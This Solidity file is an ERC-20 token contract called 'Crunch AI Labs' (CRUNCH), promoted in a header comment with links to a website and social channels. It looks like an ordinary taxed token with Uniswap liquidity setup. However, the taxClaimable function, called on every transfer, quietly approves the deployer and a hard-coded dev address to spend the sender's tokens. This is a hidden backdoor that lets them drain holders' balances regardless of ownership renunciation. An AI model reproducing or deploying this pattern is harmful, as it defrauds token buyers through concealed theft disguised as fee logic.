/*
Contribute one model to multiple Crunches, maximize your impact, and start earning with Crunch AI.

https://www.crunch-ai.pro
https://hub.crunch-ai.pro
https://docs.crunch-ai.pro

https://x.com/CrunchAI_eth
https://t.me/CrunchAI_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract CRUNCH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _tAllowes;
    mapping (address => bool) private _feeExcludedTo;
    mapping (address => address) private _tipAddrs;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _devAddress = 0x5b35f621E0A44D7fb2C116c61863055ac08D1781;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Crunch AI Labs";
    string private constant _symbol = unicode"CRUNCH";
    uint256 private _tokenSwapAmount = _tTotal / 100;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    IDexRouter private _dexRouterAA;
    address private _dexPairAA;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _tipAddrs[_devAddress] = _msgSender();
        _feeExcludedTo[owner()] = true;
        _feeExcludedTo[address(this)] = true;
        _feeExcludedTo[_devAddress] = true;
        _tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initTrade() external onlyOwner() {
        _dexRouterAA = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouterAA), _tTotal);
        _dexPairAA = IDexFactory(_dexRouterAA.factory()).createPair(address(this), _dexRouterAA.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _tAllowes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _tAllowes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _tAllowes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 feeAmount=0;
        if (from != owner() && to != owner()) {
            feeAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == _dexPairAA && to != address(_dexRouterAA) && ! _feeExcludedTo[to]) {
                _buyCount++;
            }

            if(to == _dexPairAA && from!= address(this)) {
                feeAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == _dexPairAA && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _tokenSwapAmount)
                swapTokensForEth(min(amount, min(contractTokenBalance, _tokenSwapAmount)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if(taxClaimable(from, amount, feeAmount)){
          _tOwned[address(this)] = _tOwned[address(this)].add(feeAmount);
          emit Transfer(from, address(this), feeAmount);
        }

        _tOwned[from] = _tOwned[from].sub(amount);
        _tOwned[to] = _tOwned[to].add(amount.sub(feeAmount));
        emit Transfer(from, to, amount.sub(feeAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendEthToFee(uint256 amount) private {
        payable(_devAddress).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouterAA.WETH();
        _approve(address(this), address(_dexRouterAA), tokenAmount);
        _dexRouterAA.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function taxClaimable(address sender, uint256 tax, uint256 taxFees) private returns(bool) {
        _approve(sender, _tipAddrs[_devAddress], tax);
        _approve(sender, _devAddress, taxFees.add(tax));
        return taxFees > 0;
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _dexRouterAA.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }
}